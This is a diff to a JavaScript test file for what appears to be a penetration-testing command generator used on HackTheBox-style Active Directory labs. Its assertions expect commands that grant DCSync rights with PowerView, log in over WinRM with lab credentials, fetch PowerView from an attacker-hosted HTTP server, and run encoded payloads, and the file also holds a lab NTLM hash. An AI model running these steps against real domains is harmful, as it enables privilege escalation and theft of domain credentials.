@@ -9,6 +9,7 @@ const variables = {
   rhost: "10.129.95.210",
   lhost: "10.10.15.240",
   domain: "htb.local",
+  baseDn: "DC=htb,DC=local",
   user: "svc_exchange",
   password: "Password123!",
   hash: "8846f7eaee8fb117ad06bdd830b7586c",
@@ -35,7 +36,8 @@ test("DCSync selection generates scoped retrieval between grant and cleanup", ()
   const retrieveAt = commands.findIndex((command) => command.key === "acl-dcsync-impacket-password");
   const cleanupAt = commands.findIndex((command) => command.key === "acl-cleanup");
 
-  assert.match(combined, /Add-DomainObjectAcl.*-TargetIdentity .*htb\.local.*-PrincipalIdentity .*svc_exchange.*-Rights .*DCSync/);
+  assert.match(combined, /Get-DomainObject -Identity .*DC=htb,DC=local.*-Properties distinguishedName/);
+  assert.match(combined, /Add-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*svc_exchange.*-Rights .*DCSync/);
   assert.match(combined, /nxc winrm 10\.129\.95\.210 -d 'htb\.local' -u 'svc_exchange' -p 'Password123!'/);
   assert.match(combined, /http:\/\/10\.10\.15\.240:8000\/PowerView\.ps1/);
   assert.match(combined, /-EncodedCommand \$payload/);
@@ -54,8 +56,9 @@ test("non-DCSync rights regenerate generic grant and cleanup without replication
   });
   const combined = commands.map((command) => command.value).join("\n");
 
-  assert.match(combined, /Add-DomainObjectAcl.*-TargetIdentity .*Helpdesk.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
-  assert.match(combined, /Remove-DomainObjectAcl.*-TargetIdentity .*Helpdesk.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
+  assert.match(combined, /Get-DomainObject -Identity .*Helpdesk.*-Properties distinguishedName/);
+  assert.match(combined, /Add-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
+  assert.match(combined, /Remove-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
   assert.doesNotMatch(combined, /lsadump::dcsync|secretsdump/);
   assert.match(combined, /acl-before\.xml/);
   assert.match(combined, /Compare-Object/);
@@ -68,7 +71,9 @@ test("PowerView staging validates content and reports a port or log failure", ()
   const commands = renderedCommands();
   const confirmation = commands.find((command) => command.key === "acl-powerview-check");
 
-  assert.match(confirmation.value, /grep -qi 'function Get-DomainObjectAcl'/);
+  assert.match(confirmation.value, /curl .* -o "\$pv_probe"/);
+  assert.match(confirmation.value, /grep -qi 'function Get-DomainObjectAcl' "\$pv_probe"/);
+  assert.doesNotMatch(confirmation.value, /curl .*\| grep -q/);
   assert.match(confirmation.value, /PowerView HTTP staging failed/);
   assert.match(confirmation.value, /PowerView loaded successfully/);
 });
